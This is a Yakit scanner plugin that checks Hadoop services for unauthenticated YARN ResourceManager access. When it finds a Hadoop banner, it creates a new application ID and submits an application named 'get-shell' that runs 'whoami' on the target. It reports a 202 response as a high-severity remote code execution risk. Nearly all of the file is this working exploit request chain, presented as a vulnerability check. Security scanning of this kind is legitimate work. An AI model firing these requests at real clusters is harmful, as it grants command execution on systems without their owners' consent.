# port scan plugin
yakit.AutoInitYakit()
log.setLevel("info")

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet = `
POST /ws/v1/cluster/apps/new-application HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: no-cache
Content-Length: 0
Content-Type: application/x-www-form-urlencoded
Pragma: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

`

Sendpacket = `
POST /ws/v1/cluster/apps HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: no-cache
Content-Length: 0
Content-Type: application/json
Pragma: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

{"application-id": "{{params(id)}}", "application-name": "get-shell", "am-container-spec": {"commands": {"command": "whoami"}}, "application-type": "YARN"}`

    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target":addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    
    hand, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
    application = re.Find(body, `\<application-id\>\w*\<`)
    id = re.ReplaceAll(application, `\<application-id\>`, "")
    id = re.ReplaceAll(id, `\<`, "")

    sendrsp,sendreq,_ = poc.HTTP(Sendpacket, 
    poc.params({"target":addr,"id":id}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )

    drsp, derr = str.ParseBytesToHTTPResponse(sendrsp)

    // dump(rsp)
    if len(rsp) > 0 {
        if drsp.StatusCode == 202 {
            yakit.Info("%v Hadoop YARN ResourceManager 未授权访问", addr)
            risk.NewRisk(
                addr,risk.title("Hadoop YARN ResourceManager 未授权访问"),
                risk.severity("high"),
                risk.titleVerbose("Hadoop YARN ResourceManager 未授权访问"),
                risk.type("RCE[Hadoop]"),
                risk.details({
                    "request": sendreq,
                    "response": sendrsp,
                    "url": addr,
                }),
            )
        }
    }

    return
}
handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    // dump(result.GetServiceName())
    // println("-------------------------------")
    // dump(result.GetCPEs())
    // println("-------------------------------")
    // dump(result.GetDomains())
    // println("-------------------------------")
    // dump(result.GetHtmlTitle())
    // println("-------------------------------")
    // dump(result.GetProto())
    // println("-------------------------------")
    // dump(result.Fingerprint.banner)

    if len(result.Fingerprint.HttpFlows)>0{
        if str.MatchAllOfSubString(result.Fingerprint.banner, "Hadoop") {
            handleCheck(result.Target,result.Port)
        }
    }
    
}
